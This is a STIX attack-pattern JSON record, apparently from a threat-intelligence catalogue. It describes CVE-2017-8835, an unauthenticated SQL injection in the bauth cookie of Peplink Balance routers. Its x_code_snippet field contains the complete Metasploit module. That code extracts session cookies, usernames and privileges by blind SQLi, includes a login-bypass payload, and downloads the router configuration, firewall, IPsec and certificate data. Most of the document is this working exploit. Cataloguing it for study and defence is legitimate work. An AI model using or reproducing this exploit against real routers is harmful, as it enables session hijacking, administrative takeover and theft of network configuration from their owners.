{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--56609046-2428-4791-8217-a3181fad623c",
    "created": "2024-08-14T16:32:23.169707Z",
    "modified": "2024-08-14T16:32:23.169711Z",
    "name": "Peplink Balance routers SQLi",
    "description": " Firmware versions up to 7.0.0-build1904 of Peplink Balance routers are affected by an unauthenticated SQL injection vulnerability in the bauth cookie, successful exploitation of the vulnerability allows an attacker to retrieve the cookies of authenticated users, bypassing the web portal authentication.  By default, a session expires 4 hours after login (the setting can be changed by the admin), for this reason, the module attempts to retrieve the most recently created sessions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/peplink_bauth_sqli.rb",
            "external_id": "peplink_bauth_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-8835"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/red0xff/c4511d2f427efcb8b018534704e9607a"
        }
    ],
    "x_code_snippet": "class MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Peplink Balance routers SQLi',\n        'Description' => %q{\n          Firmware versions up to 7.0.0-build1904 of Peplink Balance routers are affected by an unauthenticated\n          SQL injection vulnerability in the bauth cookie, successful exploitation of the vulnerability allows an\n          attacker to retrieve the cookies of authenticated users, bypassing the web portal authentication.\n\n          By default, a session expires 4 hours after login (the setting can be changed by the admin), for this\n          reason, the module attempts to retrieve the most recently created sessions.\n        },\n        'Author' => [\n          'X41 D-Sec GmbH <info@x41-dsec.de>', # Original Advisory\n          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => %w[linux],\n        'References' => [\n          [ 'EDB', '42130' ],\n          [ 'CVE', '2017-8835' ],\n          [ 'URL', 'https://gist.github.com/red0xff/c4511d2f427efcb8b018534704e9607a' ]\n        ],\n        'Targets' => [['Wildcard Target', {}]],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The target URI', '/']),\n        OptBool.new('BypassLogin', [true, 'Just bypass login without trying to leak the cookies of active sessions', false]),\n        OptBool.new('EnumUsernames', [true, 'Retrieve the username associated with each session', false]),\n        OptBool.new('EnumPrivs', [true, 'Retrieve the privilege associated with each session', false]),\n        OptInt.new('LimitTries', [false, 'The max number of sessions to try (from most recent), set to avoid checking expired ones needlessly', nil]),\n        OptBool.new('AdminOnly', [true, 'Only attempt to retrieve cookies of privilegied users (admins)', false])\n      ]\n    )\n  end\n\n  def perform_sqli\n    # NOTE: using run_sql because there is a limit on the length of our queries\n    # will work only if we remove the casts, NULL value handling etc.\n    digit_range = ('0'..'9')\n    bit_range = ('0'..'1')\n    alphanumeric_range = ('0'..'z')\n    session_count = @sqli.run_sql(\"select count(1) from sessionsvariables where name='expire'\").to_i\n    print_status \"There are #{session_count} (possibly expired) sessions\"\n\n    # limit the number of session cookies to retrieve if the option is set\n    session_count = datastore['LimitTries'] if datastore['LimitTries'] && datastore['LimitTries'] < session_count\n\n    session_ids = session_count.times.map do |i|\n      id = @sqli.run_sql('select id from sessionsvariables ' \\\n                    \"where name='expire' order by \" \\\n                    \"cast(value as int) desc limit 1 offset #{i}\", output_charset: digit_range).to_i\n      # if AdminOnly, check if is an admin\n      if datastore['AdminOnly']\n        is_rwa = @sqli.run_sql(\"select count(1)>0 from sessionsvariables where id=#{id} and name='rwa' and value='1'\", output_charset: bit_range).to_i\n        is_rwa > 0 ? id : nil\n      else\n        id\n      end\n    end.compact\n\n    print_status(\"After filtering out non-admin sessions: #{session_ids.count} sessions remain\") if datastore['AdminOnly']\n\n    if session_ids.count == 0\n      print_error('No active authenticated sessions found, try again after a user has authenticated')\n      return\n    end\n\n    print_status('Trying the ids from the most recent logins')\n\n    cookies = [ ]\n\n    session_ids.each_with_index do |id, idx|\n      cookie = @sqli.run_sql(\"select sessionid from sessions where id=#{id}\", output_charset: alphanumeric_range)\n      cookies << cookie\n      if datastore['EnumUsernames']\n        username = @sqli.run_sql(\"select value from sessionsvariables where name='username' and id=#{id}\")\n      end\n\n      if datastore['EnumPrivs']\n        is_rwa = @sqli.run_sql(\"select count(1)>0 from sessionsvariables where id=#{id} and name='rwa' and value='1'\", output_charset: bit_range).to_i\n      end\n      username_msg = username ? \", username = #{username}\" : ''\n      is_admin_msg = if is_rwa\n                       \", with #{is_rwa > 0 ? 'read/write' : 'read-only'} permissions\"\n                     else\n                       ''\n                     end\n      print_good \"Found cookie #{cookie}#{username_msg}#{is_admin_msg}\"\n      break if session_count == idx + 1\n    end\n    cookies\n  end\n\n  # returns false if data has an error message, the data otherwise\n  def parse_and_check_for_errors(data)\n    xml = ::Nokogiri::XML(data)\n    if xml.errors.empty? && data.include?('errorMessage')\n      print_error xml.css('errorMessage')[0].text\n      false\n    else\n      xml.errors.empty? ? xml : data\n    end\n  end\n\n  def get_data_by_option(cookie, option)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'data.cgi'),\n      'method' => 'GET',\n      'cookie' => \"bauth=#{cookie}\",\n      'vars_get' => {\n        'option' => option\n      }\n    })\n    return '' if option == 'noop' && res.code == 200 && parse_and_check_for_errors(res.body)\n\n    if res.code == 200\n      print_status \"Retrieving #{option}\"\n      xml = parse_and_check_for_errors(res.body)\n      if xml\n        print_xml_data(xml)\n        path = store_loot(\"peplink #{option}\", 'text/xml', datastore['RHOST'], res.body)\n        print_good \"Saved at #{path}\"\n        xml\n      else\n        false\n      end\n    else\n      print_error \"Could not retrieve #{option}\"\n      false\n    end\n  end\n\n  def retrieve_data(cookie)\n    data_options = %w[fhlicense_info sysinfo macinfo hostnameinfo uptime client_info hubport fhstroute ipsec wan_summary firewall cert_info mvpn_summary]\n    # in case of a VPN being configured, the option cert_pem_details can leak private keys? (option=cert_pem_details&pem=)\n    # might be interesting: eqos_priority, for QoS\n    # first, attempt downloading the router configuration\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'download_config.cgi'),\n      'method' => 'GET',\n      'cookie' => \"bauth=#{cookie}\"\n    })\n    if res.code == 200\n      # router configuration consists of a 24-byte header, and .tar.gz compressed data\n      config = res.body\n      if parse_and_check_for_errors(config)\n        path = store_loot('peplink configuration tar gz', 'application/binary', datastore['RHOST'], config)\n        print_good \"Retrieved config, saved at #{path}\"\n      end\n    else\n      print_error 'Could not retrieve the router configuration file'\n    end\n\n    data_options.each do |option|\n      get_data_by_option(cookie, option)\n    end\n  end\n\n  def print_xml_data(xml)\n    nodes = [ [xml, 0] ]\n    until nodes.empty?\n      node, nesting = nodes.pop\n      if node.is_a?(Nokogiri::XML::Document)\n        node.children.each do |child|\n          nodes.push([child, nesting + 1])\n        end\n      elsif node.is_a?(Nokogiri::XML::Element)\n        node_name = node.name\n        if node.attributes && !node.attributes.empty?\n          node_name += \" {#{node.attributes.map { |(_n, attr)| \"#{attr.name}=#{attr.value}\" }.join(',')}}\"\n        end\n        vprint_good \"\\t\" * nesting + node_name\n        node.children.each do |child|\n          nodes.push([child, nesting + 1])\n        end\n      elsif node.is_a?(Nokogiri::XML::Text)\n        vprint_good \"\\t\" * nesting + node.content\n      end\n    end\n  end\n\n  def check\n    @sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'admin.cgi'),\n        'method' => 'GET',\n        'cookie' => \"bauth=' or #{payload}--\"\n      })\n      return Exploit::CheckCode::Unknown(\"Unable to connect to #{target_uri.path}\") unless res\n\n      res.get_cookies.empty? # no Set-Cookie header means the session cookie is valid\n    end\n    if @sqli.test_vulnerable\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def run\n    unless check == Exploit::CheckCode::Vulnerable\n      print_error 'Target does not seem to be vulnerable'\n      return\n    end\n    print_good 'Target seems to be vulnerable'\n    if datastore['BypassLogin']\n      cookies = [\n        \"' or id IN (select s.id from sessions as s \" \\\n              \"left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--\"\n      ]\n    else\n      cookies = perform_sqli\n    end\n    admin_cookie = cookies.detect do |c|\n      print_status \"Checking for admin cookie : #{c}\"\n      get_data_by_option(c, 'noop')\n    end\n    if admin_cookie.nil?\n      print_error 'No valid admin cookie'\n      return\n    end\n    retrieve_data(admin_cookie)\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux]"
    ]
}